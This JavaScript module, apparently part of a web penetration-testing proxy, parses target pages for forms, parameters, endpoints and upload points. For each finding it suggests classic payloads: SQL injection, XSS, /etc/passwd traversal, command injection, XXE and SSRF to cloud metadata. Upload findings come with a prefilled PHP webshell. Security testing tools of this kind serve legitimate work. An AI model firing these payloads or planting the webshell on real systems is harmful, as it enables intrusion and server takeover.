/**
 * Analisis permukaan serangan (attack surface) dari body respons target.
 *
 * Modul ini membaca HTML/JSON hasil respons dan mengekstrak titik-titik yang
 * kemungkinan bisa diserang: formulir, parameter query, endpoint, titik unggah
 * berkas, komentar, dan indikasi pesan error. Setiap temuan disertai rekomendasi
 * metode HTTP dan contoh payload.
 *
 * Murni heuristik berbasis regex — tidak ada dependensi parser tambahan dan
 * tidak melakukan permintaan jaringan apa pun.
 */

const MAX_FINDINGS = 60;
const MAX_COMMENT_PREVIEW = 140;

/**
 * Aturan pencocokan nama parameter -> perkiraan kelas kerentanan.
 * Urutan penting: aturan pertama yang cocok ikut menyumbang risikonya.
 */
const PARAM_RULES = [
    {
        re: /(cmd|exec|command|ping|shell|system|run|eval)/i,
        risks: ["Command Injection", "RCE"],
    },
    { re: /(pass|pwd|password|passwd)/i, risks: ["SQLi", "Auth bypass"] },
    {
        re: /(file|path|view|include|template|tpl|folder|dir|load|read|page|doc)/i,
        risks: ["LFI", "SSTI"],
    },
    {
        re: /(url|uri|redirect|next|return|goto|dest|callback|target|host)/i,
        risks: ["Open Redirect", "SSRF"],
    },
    {
        re: /(token|csrf|nonce|secret|apikey|api_key|auth|session)/i,
        risks: ["Token/CSRF"],
    },
    {
        re: /(xml|data|json|payload|serialized|object|blob)/i,
        risks: ["XXE", "Deserialization"],
    },
    {
        re: /(user|email|name|comment|message|content|text|title|subject|body|q|search|keyword|s)\b/i,
        risks: ["XSS", "SQLi"],
    },
    {
        re: /(id|uid|pid|nid|no|num|key|ref|account|order)/i,
        risks: ["SQLi", "IDOR"],
    },
];

/**
 * Contoh payload per kelas kerentanan, diselaraskan dengan preset vektor di
 * `vectors.js` (sebagian sudah URL-encoded).
 */
const RISK_PAYLOADS = {
    SQLi: [
        "1%20UNION%20SELECT%20password%20FROM%20users",
        "1' OR '1'='1",
        "1' AND SLEEP(5)--",
    ],
    XSS: ["%3Cscript%3Ealert(1)%3C%2Fscript%3E", '"><svg onload=alert(1)>'],
    "XSS (stored)": ["<script>alert(document.cookie)</script>"],
    LFI: [
        "../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    SSTI: ["%7B%7B7*7%7D%7D", "${7*7}"],
    "Command Injection": [";id", "$(id)", "|whoami"],
    RCE: ['<?php system($_GET["c"]); ?>'],
    "Open Redirect": ["https://evil.example", "//evil.example"],
    SSRF: ["http://127.0.0.1:80/", "http://169.254.169.254/latest/meta-data/"],
    IDOR: ["ubah id ke objek milik pengguna lain"],
    BOLA: ["akses endpoint dengan id/token milik objek lain"],
    CSRF: ["kirim tanpa token"],
    "Token/CSRF": ["hapus atau ganti token", "pakai token sesi lain"],
    "Auth bypass": ["' OR '1'='1", "admin'--"],
    XXE: ['<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>'],
    Deserialization: ['O:8:"stdClass":0:{}'],
    "File Upload": ["shell.php", "shell.phtml", "shell.php.jpg", ".htaccess"],
    "Info Disclosure": ["periksa komentar/stack trace untuk kredensial"],
    Enumeration: ["akses tanpa autentikasi untuk uji IDOR/BOLA"],
};

const STATIC_ASSET_RE =
    /\.(css|js|mjs|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|webp|mp4|webm)(\?|#|$)/i;

const ERROR_SIGNS = [
    {
        re: /SQLSTATE\[|SQL syntax|mysql_(query|fetch)|ORA-\d{5}|pg_query|unclosed quotation/i,
        label: "Pesan error SQL terdeteksi",
        risks: ["SQLi"],
    },
    {
        re: /Fatal error|Parse error|Warning:|Notice:|Stack trace|Traceback \(most recent call last\)/i,
        label: "Pesan error / stack trace terbuka",
        risks: ["Info Disclosure"],
    },
    {
        re: /(Illuminate\\|Symfony\\Component|Whoops|Laravel|DebugBar)/i,
        label: "Detail framework terungkap",
        risks: ["Info Disclosure", "RCE"],
    },
];

function uniqueBy(list, keyFn) {
    const seen = new Set();
    const out = [];

    for (const item of list) {
        const key = keyFn(item);

        if (!seen.has(key)) {
            seen.add(key);
            out.push(item);
        }
    }

    return out;
}

function parseAttrs(str) {
    const attrs = {};
    const re =
        /([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/g;
    let match;

    while ((match = re.exec(str))) {
        attrs[match[1].toLowerCase()] = match[2] ?? match[3] ?? match[4] ?? "";
    }

    return attrs;
}

function risksForParam(name) {
    const risks = new Set();

    for (const rule of PARAM_RULES) {
        if (rule.re.test(name)) {
            rule.risks.forEach((risk) => risks.add(risk));
        }
    }

    return risks.size > 0 ? [...risks] : ["XSS", "SQLi"];
}

function payloadsFor(risks) {
    const out = [];

    for (const risk of risks) {
        for (const payload of RISK_PAYLOADS[risk] ?? []) {
            if (!out.includes(payload)) {
                out.push(payload);
            }
        }
    }

    return out;
}

function pathOnly(value) {
    const queryIndex = value.indexOf("?");

    return queryIndex === -1 ? value : value.slice(0, queryIndex);
}

function decodeComponent(value) {
    const plusDecoded = String(value).replace(/\+/g, " ");

    try {
        return decodeURIComponent(plusDecoded);
    } catch {
        return plusDecoded;
    }
}

/**
 * Mengubah action/href menjadi path yang bisa dipakai proxy (origin target
 * ditambahkan oleh proxy). URL absolut diubah menjadi path + query.
 */
function toRequestPath(value) {
    if (/^https?:\/\//i.test(value)) {
        try {
            const url = new URL(value);

            return `${url.pathname}${url.search}`;
        } catch {
            return value;
        }
    }

    return value.startsWith("/") ? value : `/${value}`;
}

function paramsFromUrl(value) {
    const queryIndex = value.indexOf("?");

    if (queryIndex === -1) {
        return [];
    }

    let query = value.slice(queryIndex + 1);
    const hashIndex = query.indexOf("#");

    if (hashIndex !== -1) {
        query = query.slice(0, hashIndex);
    }

    return query
        .split("&")
        .map((pair) => {
            const eqIndex = pair.indexOf("=");
            const rawName = eqIndex === -1 ? pair : pair.slice(0, eqIndex);
            const rawValue = eqIndex === -1 ? "" : pair.slice(eqIndex + 1);

            return {
                name: decodeComponent(rawName),
                value: decodeComponent(rawValue),
            };
        })
        .filter((param) => param.name !== "");
}

function collectForms(html, baseUrl, add) {
    const formRe = /<form\b([^>]*)>([\s\S]*?)<\/form>/gi;
    let formMatch;

    while ((formMatch = formRe.exec(html))) {
        const attrs = parseAttrs(formMatch[1]);
        const method = (attrs.method || "GET").toUpperCase();
        const action = attrs.action || baseUrl || "(halaman ini)";
        const isMultipart = (attrs.enctype || "")
            .toLowerCase()
            .includes("multipart");

        const fields = [];
        const fieldRe = /<(input|textarea|select)\b([^>]*)>/gi;
        let fieldMatch;

        while ((fieldMatch = fieldRe.exec(formMatch[2]))) {
            const fattrs = parseAttrs(fieldMatch[2]);
            const tag = fieldMatch[1].toLowerCase();
            const type = (
                fattrs.type ?? (tag === "input" ? "text" : tag)
            ).toLowerCase();

            fields.push({ name: fattrs.name ?? "", type });
        }

        const namedFields = fields.filter((field) => field.name !== "");
        const fileFields = fields.filter((field) => field.type === "file");
        const hasPassword = fields.some((field) => field.type === "password");

        const risks = new Set();
        const fieldList = [];

        for (const field of namedFields) {
            fieldList.push(
                `${field.name}${field.type !== "text" ? ` (${field.type})` : ""}`,
            );
            risksForParam(field.name).forEach((risk) => risks.add(risk));
        }

        if (fileFields.length > 0 || isMultipart) {
            risks.add("File Upload");
        }

        if (hasPassword) {
            risks.add("Auth bypass");
        }

        const riskList = [...risks];

        const textFields = namedFields.filter((field) => field.type !== "file");
        const injectName = textFields[0]?.name ?? namedFields[0]?.name ?? null;
        const inject = injectName
            ? { in: method === "GET" ? "query" : "field", name: injectName }
            : { in: "path" };
        const request =
            method === "GET"
                ? {
                      method,
                      path: toRequestPath(action),
                      query: namedFields.map((field) => ({
                          name: field.name,
                          value: "",
                      })),
                      inject,
                  }
                : {
                      method,
                      path: toRequestPath(action),
                      fields: namedFields.map((field) => ({
                          name: field.name,
                          type: field.type,
                          value: "",
                      })),
                      inject,
                  };

        add({
            kind: "form",
            method,
            title: `Formulir ${method} → ${action}`,
            target: `${method} ${action}`,
            detail:
                fieldList.length > 0
                    ? `Field: ${fieldList.join(", ")}`
                    : "Tidak ada field bernama",
            risks: riskList,
            recommendation: `Kirim ${method} ke endpoint ini sambil menguji ${riskList.join(" / ") || "injeksi umum"} pada tiap field.`,
            payloads: payloadsFor(riskList),
            request,
        });

        if (fileFields.length > 0 || isMultipart) {
            const uploadMethod = ["POST", "PUT", "PATCH"].includes(method)
                ? method
                : "POST";

            add({
                kind: "upload",
                method: uploadMethod,
                title: `Titik unggah berkas → ${action}`,
                target: `${uploadMethod} ${action}`,
                detail: isMultipart
                    ? "Formulir multipart/form-data"
                    : 'Terdapat input type="file" (method POST untuk unggah)',
                risks: ["File Upload"],
                recommendation:
                    "Kirim berkas nyata via multipart/form-data (aktifkan panel Unggah Berkas) untuk uji webshell.",
                payloads: payloadsFor(["File Upload"]),
                request: {
                    method: uploadMethod,
                    path: toRequestPath(action),
                    upload: {
                        field: fileFields[0]?.name || "file",
                        filename: "shell.php",
                        content_type: "application/x-php",
                        content: '<?php system($_GET["cmd"]); ?>',
                    },
                    inject: { in: "file" },
                },
            });
        }
    }
}

function collectEndpoints(html, add) {
    const linkRe =
        /\b(href|src|action)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/gi;
    let match;

    while ((match = linkRe.exec(html))) {
        const attr = match[1].toLowerCase();
        const value = (match[2] ?? match[3] ?? match[4] ?? "").trim();

        if (
            value === "" ||
            value.startsWith("#") ||
            /^(javascript|mailto|tel|data):/i.test(value)
        ) {
            continue;
        }

        const params = paramsFromUrl(value);

        for (const param of params) {
            const risks = risksForParam(param.name);

            add({
                kind: "param",
                method: "GET",
                title: `Parameter "${param.name}"`,
                target: `GET ${pathOnly(value)}?${param.name}=`,
                detail: `Ditemukan pada: ${value.length > 120 ? `${value.slice(0, 120)}…` : value}`,
                risks,
                recommendation: `Uji ${risks.join(" / ")} pada parameter ini via query string (GET).`,
                payloads: payloadsFor(risks),
                request: {
                    method: "GET",
                    path: toRequestPath(pathOnly(value)),
                    query: params.map((item) => ({
                        name: item.name,
                        value: item.value,
                    })),
                    inject: { in: "query", name: param.name },
                },
            });
        }

        // `action` sudah diwakili temuan formulir, jadi hanya `href`/`src` yang
        // dijadikan temuan endpoint agar daftar tidak duplikat.
        if (
            params.length === 0 &&
            attr !== "action" &&
            !STATIC_ASSET_RE.test(value)
        ) {
            const isAbsolute = /^https?:\/\//i.test(value);

            add({
                kind: "endpoint",
                method: "GET",
                title: `Endpoint ${value}`,
                target: `GET ${value}`,
                detail: isAbsolute ? "URL absolut" : "Path relatif",
                risks: ["Enumeration"],
                recommendation:
                    "Periksa akses tanpa autentikasi (IDOR/BOLA) dan coba metode lain (POST/PUT/DELETE).",
                payloads: payloadsFor(["Enumeration"]),
                request: {
                    method: "GET",
                    path: toRequestPath(value),
                    inject: { in: "path" },
                },
            });
        }
    }
}

function collectComments(html, add) {
    const commentRe = /<!--([\s\S]*?)-->/g;
    let match;

    while ((match = commentRe.exec(html))) {
        const text = match[1].trim();

        if (text === "") {
            continue;
        }

        add({
            kind: "comment",
            method: "GET",
            title: "Komentar HTML",
            target: "body · komentar",
            detail:
                text.length > MAX_COMMENT_PREVIEW
                    ? `${text.slice(0, MAX_COMMENT_PREVIEW)}…`
                    : text,
            risks: ["Info Disclosure"],
            recommendation:
                "Periksa komentar untuk kebocoran kredensial/endpoint tersembunyi, lalu uji HTML injection.",
            payloads: payloadsFor(["Info Disclosure"]),
        });
    }
}

function detectErrors(html, add) {
    for (const sign of ERROR_SIGNS) {
        if (sign.re.test(html)) {
            add({
                kind: "error",
                method: "GET",
                title: sign.label,
                target: "body · error",
                detail: "Pola khas pesan error ditemukan pada body respons.",
                risks: sign.risks,
                recommendation: `Manfaatkan pesan verbose untuk ${sign.risks.join(" / ")}; uji input yang memicu error.`,
                payloads: payloadsFor(sign.risks),
            });
        }
    }
}

function collectJsonKeys(value, depth, out) {
    if (depth > 3 || out.length >= 20) {
        return;
    }

    if (Array.isArray(value)) {
        if (value.length > 0) {
            collectJsonKeys(value[0], depth + 1, out);
        }

        return;
    }

    if (value && typeof value === "object") {
        for (const [key, nested] of Object.entries(value)) {
            if (out.length >= 20) {
                return;
            }

            if (!out.includes(key)) {
                out.push(key);
            }

            collectJsonKeys(nested, depth + 1, out);
        }
    }
}

function collectJsonFields(body, contentType, add) {
    const trimmed = body.trim();
    const looksJson =
        contentType.includes("json") ||
        trimmed.startsWith("{") ||
        trimmed.startsWith("[");

    if (!looksJson || trimmed === "" || trimmed.length > 500_000) {
        return;
    }

    let parsed;

    try {
        parsed = JSON.parse(trimmed);
    } catch {
        return;
    }

    const keys = [];
    collectJsonKeys(parsed, 0, keys);

    for (const key of keys) {
        const risks = risksForParam(key);

        add({
            kind: "param",
            method: "POST",
            title: `Field JSON "${key}"`,
            target: `POST body · ${key}`,
            detail: "Kunci pada body JSON respons",
            risks,
            recommendation: `Uji ${risks.join(" / ")} pada field ini melalui body JSON (POST/PUT).`,
            payloads: payloadsFor(risks),
            request: {
                method: "POST",
                path: null,
                inject: { in: "json", name: key },
            },
        });
    }
}

/**
 * Menganalisis body respons dan mengembalikan daftar temuan + ringkasan.
 *
 * @param {string} body       Body respons (HTML/JSON/teks).
 * @param {object} [options]
 * @param {string} [options.baseUrl]     Origin target (untuk path relatif).
 * @param {string} [options.contentType] Content-Type respons.
 * @returns {{ findings: object[], summary: object }}
 */
export function analyzeSurface(body, options = {}) {
    const html = typeof body === "string" ? body : "";
    const baseUrl = options.baseUrl ?? "";
    const contentType = options.contentType ?? "";

    const raw = [];
    const add = (finding) => raw.push(finding);

    if (html.trim() !== "") {
        collectForms(html, baseUrl, add);
        collectEndpoints(html, add);
        collectComments(html, add);
        detectErrors(html, add);
        collectJsonFields(html, contentType, add);
    }

    const findings = uniqueBy(
        raw,
        (finding) =>
            `${finding.kind}|${finding.method}|${finding.target}|${finding.detail ?? ""}`,
    ).slice(0, MAX_FINDINGS);

    const countOf = (kind) =>
        findings.filter((finding) => finding.kind === kind).length;

    return {
        findings,
        summary: {
            total: findings.length,
            form: countOf("form"),
            param: countOf("param"),
            endpoint: countOf("endpoint"),
            upload: countOf("upload"),
            comment: countOf("comment"),
            error: countOf("error"),
        },
    };
}
